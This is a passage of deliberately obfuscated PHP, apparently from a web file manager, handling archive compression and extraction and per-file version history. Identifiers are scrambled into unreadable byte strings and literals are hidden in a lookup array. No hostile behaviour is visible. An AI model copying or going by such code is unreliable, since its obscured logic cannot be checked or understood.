$í„ª…¬©[12]; if ($ò—Ù–½µ) { $À¼ìİ”­ = get_path_father($ò—Ù–½µ); $ı¯¥®»¬ = get_path_this($ò—Ù–½µ); } else { $À¼ìİ”­ = self::pathFather($Üíöóêƒ[$í„ª…¬©[84]]); $ı¯¥®»¬ = $Üíöóêƒ[$í„ª…¬©[32]] . $í„ª…¬©[10] . $××Ÿ¹œ£; if (count($¤œÜŒ«©) > 1) { $˜©–ìû = IO::info($À¼ìİ”­); $ı¯¥®»¬ = $˜©–ìû[$í„ª…¬©[32]] . $í„ª…¬©[10] . $××Ÿ¹œ£; } } if ($Å·ÊØšû->getType() == $í„ª…¬©[106]) { $¼€…°æ’ = self::init($À¼ìİ”­); $™éïƒ¿… = $¼€…°æ’->getType() == $í„ª…¬©[106] ? $À¼ìİ”­ : get_path_father($Å·ÊØšû->path); $™éïƒ¿… = rtrim($™éïƒ¿…, $í„ª…¬©[8]) . $í„ª…¬©[8]; mk_dir($™éïƒ¿…); } else { $•Šöñ¾Ü = TEMP_FILES . $í„ª…¬©[1198] . time() . rand_string(8) . $í„ª…¬©[8]; mk_dir($•Šöñ¾Ü); file_put_contents($•Šöñ¾Ü . $í„ª…¬©[1199], $í„ª…¬©[12]); $™éïƒ¿… = $•Šöñ¾Ü; } $Šó™×²´ = IO::info($™éïƒ¿…); if (!$Šó™×²´ || !$Šó™×²´[$í„ª…¬©[202]]) { show_json(LNG($í„ª…¬©[1200]), !1); } $¶ìğ¹È = self::zipFileList($¤œÜŒ«©, $•Šöñ¾Ü); foreach ($¶ìğ¹È as $‹ÎÊŠ°Õ => $áŞØâˆ) { $¶ìğ¹È[$‹ÎÊŠ°Õ] = self::iconvSystem($áŞØâˆ); } $ß‚ïë¢™ = get_filename_auto($™éïƒ¿… . $ı¯¥®»¬, $í„ª…¬©[12], $¿¿ÒÏ¯ï); KodArchive::create(self::iconvSystem($ß‚ïë¢™), $¶ìğ¹È); if (!IO::exist($ß‚ïë¢™)) { if ($•Šöñ¾Ü) { del_dir($•Šöñ¾Ü); } show_json(LNG($í„ª…¬©[1201]), !1); } if (!$•Šöñ¾Ü) { return $ß‚ïë¢™; } $ÒÂş¸ú± = self::move($ß‚ïë¢™, $À¼ìİ”­, $¿¿ÒÏ¯ï); if ($•Šöñ¾Ü) { del_dir($•Šöñ¾Ü); } if (!$ß‚ïë¢™) { show_json(LNG($í„ª…¬©[1201]), !1); } return $ÒÂş¸ú±; } public static function unzip($È¾Ôá, $‘š³ğ¹¡, $ŠÌéâßÆ = "\55\x31", $„™©›õ = "\x72\x65\x70\154\x61\143\145") { $ÊÕóõÔ† =& $_SERVER[Ã¶¡¶„æ]; $Ë‹„Õ×¬ = parent::info($È¾Ôá); if (!$Ë‹„Õ×¬) { show_json(LNG($ÊÕóõÔ†[1202]), !1); } $‘…¼ƒìç = IO::infoFull($‘š³ğ¹¡); if (!$‘…¼ƒìç) { $‘š³ğ¹¡ = IO::mkdir($‘š³ğ¹¡); } if (isset($‘…¼ƒìç[$ÊÕóõÔ†[402]]) && trim($‘…¼ƒìç[$ÊÕóõÔ†[84]], $ÊÕóõÔ†[8]) != trim($‘š³ğ¹¡, $ÊÕóõÔ†[8])) { $öÚ¬¼äŒ = KodIO::make($‘…¼ƒìç[$ÊÕóõÔ†[432]]); $¨˜É­§ƒ = IO::fileNameAuto($öÚ¬¼äŒ, $‘…¼ƒìç[$ÊÕóõÔ†[32]], REPEAT_RENAME_FOLDER, !0); $‘š³ğ¹¡ = IO::mkdir($öÚ¬¼äŒ . $¨˜É­§ƒ); } $ŠÌéâßÆ = $ŠÌéâßÆ && $ŠÌéâßÆ != $ÊÕóõÔ†[1203] ? @json_decode($ŠÌéâßÆ, !0) : -1; $ÅÁöÌ“ë = self::unzipPart($È¾Ôá, $ŠÌéâßÆ); if (!$ÅÁöÌ“ë || !IO::exist($ÅÁöÌ“ë[$ÊÕóõÔ†[199]])) { show_json(LNG($ÊÕóõÔ†[105]), !1); } $Öƒ€ ˜£ = $ÅÁöÌ“ë[$ÊÕóõÔ†[1204]][count($ÅÁöÌ“ë[$ÊÕóõÔ†[1204]]) - 1]; if ($Öƒ€ ˜£[$ÊÕóõÔ†[1205]] == -1 || substr($Öƒ€ ˜£[$ÊÕóõÔ†[32]], -1, 1) == $ÊÕóõÔ†[8]) { $ıöÈş–š = $ÅÁöÌ“ë[$ÊÕóõÔ†[1206]] . rand_string(10) . $ÊÕóõÔ†[8]; mk_dir($ıöÈş–š); $æÄ¨˜¥¨ = count($ÅÁöÌ“ë[$ÊÕóõÔ†[1204]]) == 1 ? IO::ext($È¾Ôá) : get_path_ext($ÅÁöÌ“ë[$ÊÕóõÔ†[199]]); $ºÓ§Æ­Ê = KodArchive::extract(self::iconvSystem($ÅÁöÌ“ë[$ÊÕóõÔ†[199]]), $ıöÈş–š, $Öƒ€ ˜£[$ÊÕóõÔ†[1205]], $¨˜É­§ƒ, $æÄ¨˜¥¨); self::unzipErrorCheck($ºÓ§Æ­Ê, array($ÊÕóõÔ†[1207], $È¾Ôá, $æÄ¨˜¥¨, $‘š³ğ¹¡, $ÅÁöÌ“ë)); Hook::trigger($ÊÕóõÔ†[1208], $ıöÈş–š); recursion_dir($ıöÈş–š, $ í•ıÂı, $ì¿®Å‹ı, 0); $¾Îªš’ô = array_merge($ í•ıÂı, $ì¿®Å‹ı); $ê˜Ùëó° = array(); foreach ($¾Îªš’ô as $Áêë‚») { $ÇÄ›ĞáØ = IO::move(self::iconvApp($Áêë‚»), $‘š³ğ¹¡, $„™©›õ); if ($ÇÄ›ĞáØ) { $ê˜Ùëó°[] = $ÇÄ›ĞáØ; } } del_dir($ıöÈş–š); } else { $ÇÄ›ĞáØ = IO::move($ÅÁöÌ“ë[$ÊÕóõÔ†[199]], $‘š³ğ¹¡, $„™©›õ, get_path_this($Öƒ€ ˜£[$ÊÕóõÔ†[32]])); if ($ÇÄ›ĞáØ) { $ê˜Ùëó°[] = $ÇÄ›ĞáØ; } } return $ê˜Ùëó° ? $ê˜Ùëó° : !1; } public static function unzipList($’˜ÎÕÁ›) { $îšŠ´Å‘ =& $_SERVER[Ã¶¡¶„æ]; $Ú÷µò¿› = isset($’˜ÎÕÁ›[$îšŠ´Å‘[1209]]) ? $’˜ÎÕÁ›[$îšŠ´Å‘[1209]] : !1; $ÕÄ»ÔÒÄ = isset($’˜ÎÕÁ›[$îšŠ´Å‘[1205]]) ? @json_decode($’˜ÎÕÁ›[$îšŠ´Å‘[1205]], !0) : -1; $ËŸÙ™É = self::unzipPart($’˜ÎÕÁ›[$îšŠ´Å‘[84]], $ÕÄ»ÔÒÄ); if (!$ËŸÙ™É || !IO::exist($ËŸÙ™É[$îšŠ´Å‘[199]])) { show_json(LNG($îšŠ´Å‘[105]), !1); } $İÍàÖÌ = $ËŸÙ™É[$îšŠ´Å‘[1204]][count($ËŸÙ™É[$îšŠ´Å‘[1204]]) - 1]; $÷æ±¸Ú¤ = in_array(IO::ext($ËŸÙ™É[$îšŠ´Å‘[199]]), array($îšŠ´Å‘[313], $îšŠ´Å‘[1210], $îšŠ´Å‘[1211], $îšŠ´Å‘[1212], $îšŠ´Å‘[1213], $îšŠ´Å‘[1214])); if (!$Ú÷µò¿› && ($İÍàÖÌ[$îšŠ´Å‘[1205]] == -1 || $÷æ±¸Ú¤)) { $¶ãÖÌÊğ = $ËŸÙ™É[$îšŠ´Å‘[1206]] . get_path_this($ËŸÙ™É[$îšŠ´Å‘[199]]) . $îšŠ´Å‘[1215]; if (!IO::exist($¶ãÖÌÊğ)) { $Ö©±²Èí = $İÍàÖÌ[$îšŠ´Å‘[1205]] == -1 ? get_path_ext(IO::pathThis($’˜ÎÕÁ›[$îšŠ´Å‘[84]])) : get_path_ext($ËŸÙ™É[$îšŠ´Å‘[199]]); $¾¾Ò¶»ï = KodArchive::listContent(self::iconvSystem($ËŸÙ™É[$îšŠ´Å‘[199]]), !0, $Ö©±²Èí); self::unzipErrorCheck($¾¾Ò¶»ï, array($îšŠ´Å‘[1216], $’˜ÎÕÁ›, $ËŸÙ™É)); @file_put_contents($¶ãÖÌÊğ, json_encode($¾¾Ò¶»ï[$îšŠ´Å‘[1217]])); } return @json_decode(IO::getContent($¶ãÖÌÊğ), !0); } IO::fileOut($ËŸÙ™É[$îšŠ´Å‘[199]], $Ú÷µò¿›, get_path_this($İÍàÖÌ[$îšŠ´Å‘[32]])); die; } private static function zipFileList($ªÈŠ±ş, $ñ†¹£À¢ = false) { $óÆ„¤¡„ =& $_SERVER[Ã¶¡¶„æ]; $íÃ©Ô£Ş = array(); foreach ($ªÈŠ±ş as $ù‘à¼œŞ) { $Øôü•àÓ = $ù‘à¼œŞ[$óÆ„¤¡„[84]]; if ($ñ†¹£À¢) { $Øôü•àÓ = self::copy($ù‘à¼œŞ[$óÆ„¤¡„[84]], $ñ†¹£À¢, $óÆ„¤¡„[824]); } else { $ù¿È”± = self::init($ù‘à¼œŞ[$óÆ„¤¡„[84]]); if ($ù¿È”±->getType() == $óÆ„¤¡„[106]) { $Øôü•àÓ = $ù¿È”±->path; } } if ($Øôü•àÓ && self::local()->exist($Øôü•àÓ)) { $íÃ©Ô£Ş[$ù‘à¼œŞ[$óÆ„¤¡„[84]]] = $Øôü•àÓ; } } if (!empty($íÃ©Ô£Ş)) { return array_values($íÃ©Ô£Ş); } show_json(LNG($óÆ„¤¡„[1180]), !1); } private static function localFilePath($Ó¬ŞÓ¥¤) { $ŞıÏ…£Ê =& $_SERVER[Ã¶¡¶„æ]; $ĞıÍÇ«’ = KodIO::parse($Ó¬ŞÓ¥¤); if ($ĞıÍÇ«’[$ŞıÏ…£Ê[33]] == KodIO::KOD_SOURCE) { $”¡ôÛĞ™ = Model($ŞıÏ…£Ê[831])->fileInfoGet(KodIO::sourceID($Ó¬ŞÓ¥¤)); if (!$”¡ôÛĞ™[$ŞıÏ…£Ê[84]]) { show_json($ŞıÏ…£Ê[1218], !1); } $Ó¬ŞÓ¥¤ = $”¡ôÛĞ™[$ŞıÏ…£Ê[84]]; } $®†öãÆÇ = self::init($Ó¬ŞÓ¥¤); if ($®†öãÆÇ->pathParse[$ŞıÏ…£Ê[1165]]) { $Ó¬ŞÓ¥¤ = $®†öãÆÇ->pathParse[$ŞıÏ…£Ê[1165]]; $®†öãÆÇ = self::init($Ó¬ŞÓ¥¤); } $¡ŠÔòò = $®†öãÆÇ->getType(); if ($¡ŠÔòò == $ŞıÏ…£Ê[106] || $¡ŠÔòò == $ŞıÏ…£Ê[1219]) { if (!$®†öãÆÇ->exist($®†öãÆÇ->path)) { show_json(LNG($ŞıÏ…£Ê[105]), !1); } return $®†öãÆÇ->path; } return !1; } public static function unzipPart($­©«êÏà, $Á¥‡­š´ = -1) { $Ÿ¢ËÙ½¯ =& $_SERVER[Ã¶¡¶„æ]; $—ƒ·õÄ = IO::pathThis($­©«êÏà); if (!$Á¥‡­š´ || $Á¥‡­š´ == -1) { $ï Œ’«Ç = array(array($Ÿ¢ËÙ½¯[32] => $—ƒ·õÄ, $Ÿ¢ËÙ½¯[1205] => -1)); $ï Œ’«Ç[0][$Ÿ¢ËÙ½¯[1220]] = $ï Œ’«Ç[0][$Ÿ¢ËÙ½¯[32]]; } else { if (is_array($Á¥‡­š´)) { $ï Œ’«Ç = $Á¥‡­š´; $¦ïïÊÚµ = count($ï Œ’«Ç) - 1; for ($ÜÄÇ•Ôì = 0; $ÜÄÇ•Ôì <= $¦ïïÊÚµ; $ÜÄÇ•Ôì++) { $°È›¢“í = $ï Œ’«Ç[$ÜÄÇ•Ôì]; $•Ù Ã»› = get_path_this($°È›¢“í[$Ÿ¢ËÙ½¯[32]]) . (checkExtSafe($°È›¢“í[$Ÿ¢ËÙ½¯[32]]) ? $Ÿ¢ËÙ½¯[12] : $Ÿ¢ËÙ½¯[1221]); $ï Œ’«Ç[$ÜÄÇ•Ôì][$Ÿ¢ËÙ½¯[1220]] = $Ÿ¢ËÙ½¯[1222] . intval($°È›¢“í[$Ÿ¢ËÙ½¯[1205]]) . $Ÿ¢ËÙ½¯[386] . $•Ù Ã»›; if ($ÜÄÇ•Ôì == 0) { continue; } $ï Œ’«Ç[$ÜÄÇ•Ôì][$Ÿ¢ËÙ½¯[1220]] = $ï Œ’«Ç[$ÜÄÇ•Ôì - 1][$Ÿ¢ËÙ½¯[1220]] . $Ÿ¢ËÙ½¯[1223] . $ï Œ’«Ç[$ÜÄÇ•Ôì][$Ÿ¢ËÙ½¯[1220]]; } } } if (!is_array($ï Œ’«Ç) || count($ï Œ’«Ç) == 0) { return !1; } $¤öû¦Óƒ = $ï Œ’«Ç[count($ï Œ’«Ç) - 1]; if (!IO::exist($­©«êÏà)) { return !1; } $Ùµ¡¸‚Œ = TEMP_FILES . $Ÿ¢ËÙ½¯[1224] . kodIO::hashPathSafe($­©«êÏà) . $Ÿ¢ËÙ½¯[8]; $®ş•Û¸’ = $Ùµ¡¸‚Œ . $¤öû¦Óƒ[$Ÿ¢ËÙ½¯[1220]]; mk_dir($Ùµ¡¸‚Œ); file_put_contents(TEMP_FILES . $Ÿ¢ËÙ½¯[1199], $Ÿ¢ËÙ½¯[12]); if (IO::exist($®ş•Û¸’)) { return array($Ÿ¢ËÙ½¯[199] => $®ş•Û¸’, $Ÿ¢ËÙ½¯[1204] => $ï Œ’«Ç, $Ÿ¢ËÙ½¯[1206] => $Ùµ¡¸‚Œ); } $´÷Ô‚ùÍ = self::localFilePath($­©«êÏà); if (!$´÷Ô‚ùÍ) { $´÷Ô‚ùÍ = $Ùµ¡¸‚Œ . $Ÿ¢ËÙ½¯[1225]; if (!IO::exist($´÷Ô‚ùÍ)) { self::copy($­©«êÏà, $Ùµ¡¸‚Œ, !1, get_path_this($´÷Ô‚ùÍ)); } } if (!$´÷Ô‚ùÍ || !IO::exist($´÷Ô‚ùÍ)) { return !1; } if ($¤öû¦Óƒ[$Ÿ¢ËÙ½¯[1205]] == -1) { return array($Ÿ¢ËÙ½¯[199] => $´÷Ô‚ùÍ, $Ÿ¢ËÙ½¯[1204] => $ï Œ’«Ç, $Ÿ¢ËÙ½¯[1206] => $Ùµ¡¸‚Œ); } $ºÙ½”¼ = $´÷Ô‚ùÍ; foreach ($ï Œ’«Ç as $ÜÄÇ•Ôì => $°È›¢“í) { if (!$°È›¢“í || $°È›¢“í[$Ÿ¢ËÙ½¯[1205]] == $Ÿ¢ËÙ½¯[1203]) { break; } if (substr($°È›¢“í[$Ÿ¢ËÙ½¯[32]], -1, 1) == $Ÿ¢ËÙ½¯[8]) { break; } $ ÇÏ³«½ = in_array(get_path_ext($°È›¢“í[$Ÿ¢ËÙ½¯[1220]]), array($Ÿ¢ËÙ½¯[313], $Ÿ¢ËÙ½¯[1210], $Ÿ¢ËÙ½¯[1211], $Ÿ¢ËÙ½¯[1212], $Ÿ¢ËÙ½¯[1213], $Ÿ¢ËÙ½¯[1214])); $«¸Æ¢ = $ÜÄÇ•Ôì == count($ï Œ’«Ç) - 1 && $ ÇÏ³«½; $÷´½Èü– = $Ùµ¡¸‚Œ . $°È›¢“í[$Ÿ¢ËÙ½¯[1220]]; $¸è±“ûƒ = $Ùµ¡¸‚Œ . get_path_this($°È›¢“í[$Ÿ¢ËÙ½¯[32]]); if (IO::exist($÷´½Èü–)) { $ºÙ½”¼ = $÷´½Èü–; continue; } $Ğ±©ùİ = $ÜÄÇ•Ôì == 0 ? get_path_ext($—ƒ·õÄ) : get_path_ext($ºÙ½”¼); $¥˜„¦Á¤ = KodArchive::extract(self::iconvSystem($ºÙ½”¼), $Ùµ¡¸‚Œ, $°È›¢“í[$Ÿ¢ËÙ½¯[1205]], $êİÈ, $Ğ±©ùİ); self::unzipErrorCheck($¥˜„¦Á¤, array($Ÿ¢ËÙ½¯[1226], $­©«êÏà, $ï Œ’«Ç, $°È›¢“í, $÷´½Èü–)); if (IO::exist($¸è±“ûƒ)) { IO::rename($¸è±“ûƒ, get_path_this($÷´½Èü–)); } $ºÙ½”¼ = $÷´½Èü–; } $®ş•Û¸’ = $ºÙ½”¼; return array($Ÿ¢ËÙ½¯[199] => $ºÙ½”¼, $Ÿ¢ËÙ½¯[1204] => $ï Œ’«Ç, $Ÿ¢ËÙ½¯[1206] => $Ùµ¡¸‚Œ); } private static function unzipErrorCheck($ıæÛ«™§, $Ñ‰ë¶å‡ = false) { $ÆûüÎñò =& $_SERVER[Ã¶¡¶„æ]; if ($ıæÛ«™§[$ÆûüÎñò[1227]]) { return !0; } write_log(array($ÆûüÎñò[1228], $ıæÛ«™§, $Ñ‰ë¶å‡), $ÆûüÎñò[1229]); show_json($ÆûüÎñò[1230] . json_encode($ıæÛ«™§[$ÆûüÎñò[1217]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $«Êš¤ä‚ =& $_SERVER[Ã¶¡¶„æ]; $È­Î•éà = $GLOBALS[$«Êš¤ä‚[6]][$«Êš¤ä‚[89]]; if ($È­Î•éà[$«Êš¤ä‚[1231]] != 1) { return; } if ($È­Î•éà[$«Êš¤ä‚[1232]] <= 0) { return; } if (isset($_REQUEST[$«Êš¤ä‚[1233]]) && $_REQUEST[$«Êš¤ä‚[1233]] == $«Êš¤ä‚[88]) { return; } Hook::bind($«Êš¤ä‚[1234], $«Êš¤ä‚[1235]); Hook::bind($«Êš¤ä‚[1236], $«Êš¤ä‚[1237]); Hook::bind($«Êš¤ä‚[1238], $«Êš¤ä‚[1239]); Hook::bind($«Êš¤ä‚[1240], $«Êš¤ä‚[1241]); Hook::bind($«Êš¤ä‚[1242], $«Êš¤ä‚[1243]); Hook::bind($«Êš¤ä‚[1244], $«Êš¤ä‚[1245]); } public static function eventBeforeUpload($ÁêşŒÏ¾) { if ($ÁêşŒÏ¾[3] && $ÁêşŒÏ¾[3] != REPEAT_REPLACE) { return; } $œĞÌåØ€ = self::parsePath($ÁêşŒÏ¾[0]); if (!$œĞÌåØ€) { return; } self::add($œĞÌåØ€); } public static function eventBeforeEdit($¯ÌÕÅßß) { $‚…Šø‘ = self::parsePath($¯ÌÕÅßß[0]); if (!$‚…Šø‘) { return; } self::add($‚…Šø‘); } public static function eventBeforeCopyFile($šéşßı©, $Ä¸ğş«, $õÓ‡áô¿, $˜µ‹ŠÓ, $«ŒÄ¸Ü, $å¢ùùÒß) { $³ÁôÊ†î =& $_SERVER[Ã¶¡¶„æ]; if (isset($õÓ‡áô¿->_data[$³ÁôÊ†î[1169]]) && $õÓ‡áô¿->_data[$³ÁôÊ†î[1169]]) { return; } $Ù¶Òï³È = $õÓ‡áô¿->getPathOuter($˜µ‹ŠÓ); $°²–Ù´ê = self::parsePath($Ù¶Òï³È); if (!$°²–Ù´ê) { return; } self::add($°²–Ù´ê); } public static function eventBeforeRename($ÆÅ´àğ›) { $§Ù¾éÏÀ =& $_SERVER[Ã¶¡¶„æ]; $ˆ–•Ü€ = self::parsePath($ÆÅ´àğ›[0]); if (!$ˆ–•Ü€) { return; } $ÒîÎçÚÆ = self::checkInHistory($ˆ–•Ü€); if (!$ÒîÎçÚÆ) { return; } if ($ÒîÎçÚÆ[$§Ù¾éÏÀ[33]] == $§Ù¾éÏÀ[199]) { $‹™›ìĞ = self::listData($ˆ–•Ü€); if ($‹™›ìĞ && $‹™›ìĞ[$§Ù¾éÏÀ[369]]) { self::moveHistory($ˆ–•Ü€, $ÆÅ´àğ›[1]); } } else { IO::rename($ÒîÎçÚÆ[$§Ù¾éÏÀ[84]], $ÆÅ´àğ›[1]); } } public static function eventBeforeMove($±Ó°ëĞ‚) { $œ¦ˆùê© =& $_SERVER[Ã¶¡¶„æ]; $ÃèªÀë­ = self::parsePath($±Ó°ëĞ‚[0]); if (!$ÃèªÀë­) { return; } $àŞñôÑ = self::parsePath($±Ó°ëĞ‚[1]); if (!$àŞñôÑ) { return; } $ŒûÌÌ”À = $±Ó°ëĞ‚[3]; $ŒµÎÉË = self::checkInHistory($ÃèªÀë­); if (!$ŒµÎÉË) { return; } $ñÄ¨˜Ğ‰ = self::pathHistory($àŞñôÑ); if ($ŒµÎÉË[$œ¦ˆùê©[33]] == $œ¦ˆùê©[199]) { $Ñ›ƒÂ¹ = self::listData($ÃèªÀë­); $À³¯áØŞ = rtrim($àŞñôÑ, $œ¦ˆùê©[8]) . $œ¦ˆùê©[8] . ($ŒûÌÌ”À ? $ŒûÌÌ”À : get_path_this($ÃèªÀë­)); $û’¿¿¨Ä = self::listData($À³¯áØŞ); if ($Ñ›ƒÂ¹ && $Ñ›ƒÂ¹[$œ¦ˆùê©[369]] && $û’¿¿¨Ä && $û’¿¿¨Ä[$œ¦ˆùê©[369]]) { return self::clear($ÃèªÀë­); } if ($Ñ›ƒÂ¹ && $Ñ›ƒÂ¹[$œ¦ˆùê©[369]]) { self::moveHistory($ÃèªÀë­, $ŒûÌÌ”À, $ñÄ¨˜Ğ‰); } } else { IO::move($ŒµÎÉË[$œ¦ˆùê©[84]], $ñÄ¨˜Ğ‰, !1, $ŒûÌÌ”À); self::clearEmptyFolder(IO::pathFather($ŒµÎÉË[$œ¦ˆùê©[84]])); } } public static function eventAfterRemove($±Ú•¦•¶, $ïÛÏ´÷³) { $¬†°ˆğŸ =& $_SERVER[Ã¶¡¶„æ]; if (!$ïÛÏ´÷³) { return; } $Ìí¥³ªŒ = self::parsePath($±Ú•¦•¶[0]); if (!$Ìí¥³ªŒ) { return; } $Âä°Ì‘‚ = self::checkInHistory($Ìí¥³ªŒ); if (!$Âä°Ì‘‚) { return; } if ($Âä°Ì‘‚[$¬†°ˆğŸ[33]] == $¬†°ˆğŸ[199]) { $¤ˆëÙÈî = self::listData($Ìí¥³ªŒ, !1); if ($¤ˆëÙÈî && $¤ˆëÙÈî[$¬†°ˆğŸ[369]]) { self::clear($Ìí¥³ªŒ, !1); } } else { IO::remove($Âä°Ì‘‚[$¬†°ˆğŸ[84]]); self::clearEmptyFolder(IO::pathFather($Âä°Ì‘‚[$¬†°ˆğŸ[84]])); } } private static function checkInHistory($ÈÄœŒıŞ) { $¬˜«²³ˆ = self::pathHistory($ÈÄœŒıŞ); if (!IO::exist($¬˜«²³ˆ)) { $¬˜«²³ˆ .= $_SERVER[Ã¶¡¶„æ][1246]; } return IO::exist($¬˜«²³ˆ) ? IO::info($¬˜«²³ˆ) : !1; } private static function parsePath($ÛªÓÎè) { $Ø›ğÎËÍ =& $_SERVER[Ã¶¡¶„æ]; if (!$ÛªÓÎè) { return !1; } if ($GLOBALS[$Ø›ğÎËÍ[1247]]) { return; } $º’Ô¯«è = KodIO::parse($ÛªÓÎè); $Ï’ìßñ = $º’Ô¯«è[$Ø›ğÎËÍ[33]]; $Ïáæ™ßÊ = !$Ï’ìßñ || $Ï’ìßñ == KodIO::KOD_IO || $Ï’ìßñ == KodIO::KOD_SHARE_ITEM; if (!$Ïáæ™ßÊ || !$º’Ô¯«è[$Ø›ğÎËÍ[1248]]) { return !1; } if (substr($ÛªÓÎè, 0, strlen(DATA_PATH . $Ø›ğÎËÍ[1249])) == DATA_PATH . $Ø›ğÎËÍ[1249]) { return !1; } if ($Ï’ìßñ == KodIO::KOD_SHARE_ITEM) { $ Û¡§Ø† = IO::init($ÛªÓÎè); if ($ Û¡§Ø†->pathParse[$Ø›ğÎËÍ[1165]]) { return self::parsePath($ Û¡§Ø†->pathParse[$Ø›ğÎËÍ[1165]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $æ¹‡µÈ– = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Ø›ğÎËÍ[1250]); foreach ($æ¹‡µÈ– as $®‡¦·êé) { if (!$Ï’ìßñ && substr($ÛªÓÎè, 0, strlen($®‡¦·êé)) == $®‡¦·êé) { return !1; } } self::log($GLOBALS[$Ø›ğÎËÍ[1160]] . $Ø›ğÎËÍ[1251] . $ÛªÓÎè); return $ÛªÓÎè; } private static function pathHistory($´äŸæ£ø) { $˜­»‚Éó =& $_SERVER[Ã¶¡¶„æ]; $¤¤µ©°ñ = self::$_historyBase . ltrim(KodIO::clear($´äŸæ£ø), $˜­»‚Éó[8]); $¤¤µ©°ñ = str_replace(array($˜­»‚Éó[1252]), array($˜­»‚Éó[1253]), $¤¤µ©°ñ); return $¤¤µ©°ñ; } public static function log($ç¨ÊÂÍ) { } public static function historyCount($ÌÇóÀª…) { $şóğ“û =& $_SERVER[Ã¶¡¶„æ]; $Œ¹íÎÖ = array(); $¼ë½şºÄ = array(); foreach ($ÌÇóÀª… as $áı‰éª) { $ë²Üëºû = get_path_father($áı‰éª); if (!$¼ë½şºÄ[$ë²Üëºû]) { $¼ë½şºÄ[$ë²Üëºû] = array(); } $¼ë½şºÄ[$ë²Üëºû][] = get_path_this($áı‰éª); } foreach ($¼ë½şºÄ as $ë²Üëºû => $Ó®áƒ»—) { $à§øµ‘ = self::parsePath($ë²Üëºû); if (!$à§øµ‘) { continue; } foreach ($Ó®áƒ»— as $ÓŠ½ñêá) { $Ò¾•¾ = self::listData(rtrim($à§øµ‘, $şóğ“û[8]) . $şóğ“û[8] . $ÓŠ½ñêá, !1); if ($Ò¾•¾ && $Ò¾•¾[$şóğ“û[369]]) { $Œ¹íÎÖ[rtrim($ë²Üëºû, $şóğ“û[8]) . $şóğ“û[8] . $ÓŠ½ñêá] = count($Ò¾•¾[$şóğ“û[369]]); } } } return $Œ¹íÎÖ; } public static function add($êåÛÃ•ò) { $Éà÷‡¾§ =& $_SERVER[Ã¶¡¶„æ]; $¯ß·¦¬Ü = self::listData($êåÛÃ•ò); if (!$¯ß·¦¬Ü) { return; } $ãÙêŒÉ¾ = Model($Éà÷‡¾§[776])->get($Éà÷‡¾§[1254]); $ÚéËûá” = $GLOBALS[$Éà÷‡¾§[6]][$Éà÷‡¾§[89]][$Éà÷‡¾§[1232]]; $¡ïŒÜØû = $ãÙêŒÉ¾ == $Éà÷‡¾§[1255] ? min(5, $ÚéËûá”) : $ÚéËûá”; if ($ÚéËûá” <= 0) { return; } $¢áû­‘¤ = IO::info($êåÛÃ•ò); $£®şøı¡ = $¯ß·¦¬Ü[$Éà÷‡¾§[369]]; if ($¢áû­‘¤[$Éà÷‡¾§[76]] == 0) { return; } if ($¢áû­‘¤[$Éà÷‡¾§[76]] >= 1024 * 1024 * 500) { return !1; } $¿¡„ì°Š = IO::hashSimple($êåÛÃ•ò); if ($£®şøı¡ && $£®şøı¡[0][$Éà÷‡¾§[177]] == $¿¡„ì°Š) { return !0; } if (array_key_exists($Éà÷‡¾§[202], $¢áû­‘¤) && !$¢áû­‘¤[$Éà÷‡¾§[202]]) { return !1; } $‘Íö½Ü = short_id(time()); $í›šéì¨ = array($Éà÷‡¾§[399] => $‘Íö½Ü, $Éà÷‡¾§[177] => $¿¡„ì°Š, $Éà÷‡¾§[32] => $¢áû­‘¤[$Éà÷‡¾§[32]] . $Éà÷‡¾§[10] . date($Éà÷‡¾§[1256]) . rand_string(1), $Éà÷‡¾§[76] => $¢áû­‘¤[$Éà÷‡¾§[76]], $Éà÷‡¾§[454] => USER_ID, $Éà÷‡¾§[200] => time(), $Éà÷‡¾§[1257] => $Éà÷‡¾§[12]); IO::mkdir($¯ß·¦¬Ü[$Éà÷‡¾§[1258]]); $Á€±÷¤ = IO::copy($êåÛÃ•ò, $¯ß·¦¬Ü[$Éà÷‡¾§[1258]], !1, $í›šéì¨[$Éà÷‡¾§[32]]); if (!$Á€±÷¤) { self::clearEmptyFolder($¯ß·¦¬Ü[$Éà÷‡¾§[1258]]); return !1; } array_unshift($£®şøı¡, $í›šéì¨); if (count($£®şøı¡) > $¡ïŒÜØû) { $Áß“ü§ï = array_slice($£®şøı¡, $¡ïŒÜØû); foreach ($Áß“ü§ï as $ÁòøµîÖ) { IO::remove($¯ß·¦¬Ü[$Éà÷‡¾§[1258]] . $ÁòøµîÖ[$Éà÷‡¾§[32]]); } $£®şøı¡ = array_slice($£®şøı¡, 0, $¡ïŒÜØû); } return self::saveData($¯ß·¦¬Ü[$Éà÷‡¾§[1259]], $£®şøı¡); } public static function remove($ÔÌÓÁÈô, $‰î±Â†­) { $ë•é’² =& $_SERVER[Ã¶¡¶„æ]; $×Œ§¤¾£ = self::listData($ÔÌÓÁÈô); $¬Ä©ÖŸÑ = array(); if (!$×Œ§¤¾£) { return !1; } foreach ($×Œ§¤¾£[$ë•é’²[369]] as $ÌŞÈÒÛ½) { if ($ÌŞÈÒÛ½[$ë•é’²[399]] == $‰î±Â†­) { IO::remove($×Œ§¤¾£[$ë•é’²[1258]] . $ÌŞÈÒÛ½[$ë•é’²[32]]); continue; } $¬Ä©ÖŸÑ[] = $ÌŞÈÒÛ½; } return self::saveData($×Œ§¤¾£[$ë•é’²[1259]], $¬Ä©ÖŸÑ); } public static function clear($âû¿Ğ‚±, $ŠŸ“¥† = true) { $¶ê¦Š€  =& $_SERVER[Ã¶¡¶„æ]; $ñ‰šØûå = self::listData($âû¿Ğ‚±, $ŠŸ“¥†); if (!$ñ‰šØûå) { return !1; } foreach ($ñ‰šØûå[$¶ê¦Š€ [369]] as $ê’ß¡Û«) { IO::remove($ñ‰šØûå[$¶ê¦Š€ [1258]] . $ê’ß¡Û«[$¶ê¦Š€ [32]]); } return self::saveData($ñ‰šØûå[$¶ê¦Š€ [1259]], array()); } public static function moveHistory($º¥şç•¢, $¢õ¤–è¨ = '', $×¸¹ Ú = '') { $ÚŞÑ¢ñ† =& $_SERVER[Ã¶¡¶„æ]; $Ãüš•³Ä = self::listData($º¥şç•¢, !1); if (!$Ãüš•³Ä || !$Ãüš•³Ä[$ÚŞÑ¢ñ†[369]]) { return !1; } $ë£Á³ù“ = $ÚŞÑ¢ñ†[1246]; $¢õ¤–è¨ = $¢õ¤–è¨ ? $¢õ¤–è¨ : 